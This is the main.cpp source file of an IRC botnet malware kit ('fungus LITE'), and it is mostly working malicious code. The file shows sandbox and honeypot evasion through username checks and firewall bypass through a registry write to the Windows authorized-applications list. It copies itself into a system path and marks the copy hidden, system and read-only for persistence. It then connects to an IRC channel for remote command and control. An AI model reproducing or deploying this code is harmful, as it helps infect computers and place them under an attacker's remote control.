/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          
  main.cpp
  -> startup shit, fw bypass and install
*/

#include "includes.h"
#include "Confix.h"

#ifndef DEBUG
#pragma comment(lib, "Shell32")
#endif


char CurrentName[1024];

// encoded strings
char string_firewall_location[] = "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List";
char string_firewall_enabled[] = ":*:Enabled:";

/////////////////
// config ends //
/////////////////

BOOL AntiSandbox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes"};
	DWORD size = 128;
	char szUser[128];
	int i;

	GetUserName(szUser, &size);
	CharLower(szUser);

	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}

	return FALSE;
}



void BypassFirewall(char lfile[MAX_PATH])
{
	HKEY	reg;
	char	temp[MAX_PATH], t[MAX_PATH];

	strncpy(temp, string_firewall_enabled, sizeof(temp) - 1);

	_snprintf(t, sizeof(t),"%s%s%s", lfile, temp, cfg_firewall_description);

	strncpy(temp, string_firewall_location, sizeof(temp) - 1);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, temp, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, 0);
	RegSetValueEx(reg, lfile, 0, REG_SZ, (const unsigned char *)t, strlen(t));
	RegCloseKey(reg);
}


#ifndef DEBUG
BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	PathRemoveFileSpec(CurrentPath);
	char buf3[260],windir[260];
	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();
			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE;
				Sleep(15000);
			}
			else
				break;
		}
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		if (bCFRet)
		{
			return TRUE;
		}
	}
	else
	{
	}
	return FALSE;
}

#endif


#ifdef DEBUG
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
#endif
{
	char		currentfile[MAX_PATH] = {0},
				destination[MAX_PATH] = {0};

	if (AntiSandbox())
		return 0;

   // CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)&SkypeCaller, NULL, 0, 0);

	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	Sleep(400);


	if (OpenMutex(0, FALSE, cfg_mutex) != NULL)
		return 0;
	else
	{
		if (GetLastError() != ERROR_FILE_NOT_FOUND)
			return 0;
	}


     BotInstall();





#ifndef NO_RAR 
	/* RarWorm */
  //-> REMOVED IN LITE
#endif


//-> Sleep 60 seconds to let msn and yim startup
	Sleep(60*1000);
	


	/* IRC CONNECTION*/
	char test[1] = "";
	IRC_Thread((void*)test);
    

	return 0;
}
